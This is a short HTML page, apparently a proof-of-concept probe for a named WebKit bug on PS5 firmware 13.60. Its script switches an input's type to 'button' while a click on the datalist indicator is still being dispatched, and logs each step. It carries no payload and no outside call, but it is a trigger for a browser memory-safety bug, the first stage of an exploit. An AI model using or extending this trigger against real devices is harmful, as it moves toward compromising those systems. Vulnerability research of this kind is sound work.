<!doctype html>
<meta charset="utf-8">
<title>PS5 13.60 - CVE-2026-64783 Probe</title>

<style>
body {
    background:#111;
    color:#eee;
    font:18px monospace;
    padding:20px;
}
input, button {
    font:18px monospace;
    padding:10px;
    margin:8px 0;
}
#log {
    white-space:pre-wrap;
    margin-top:20px;
}
</style>

<h2>PS5 13.60 — V36</h2>
<p>CVE-2026-64783 / WebKit bug 313521</p>
<p>Datalist button lifetime probe</p>

<input
    id="target"
    type="text"
    list="values"
    placeholder="Open datalist">

<datalist id="values">
    <option value="TEST-A">
    <option value="TEST-B">
</datalist>

<br>

<button id="arm">ARM TEST</button>

<pre id="log">READY</pre>

<script>
"use strict";

const input = document.querySelector("#target");
const log = document.querySelector("#log");
const arm = document.querySelector("#arm");

let armed = false;
let changed = false;

function write(s) {
    log.textContent += "\n" + s;
}

arm.onclick = function () {

    if (armed)
        return;

    armed = true;

    arm.disabled = true;

    log.textContent =
        "V36 ARMED\n" +
        "input.type before = " +
        input.type + "\n\n" +
        "Now activate the datalist button/indicator.";

    /*
     * Capture click events associated with the input.
     *
     * The important lifetime transition is changing
     * the owning input's type while click dispatch
     * is still in progress.
     */

    input.addEventListener("click", function () {

        write("CLICK_ENTER");

        if (!changed) {

            changed = true;

            write(
                "BEFORE_TYPE_CHANGE: " +
                input.type
            );

            input.type = "button";

            write(
                "AFTER_TYPE_CHANGE: " +
                input.type
            );
        }

        write("CLICK_EXIT");

    }, true);

    write("TEST ARMED");
};
</script>
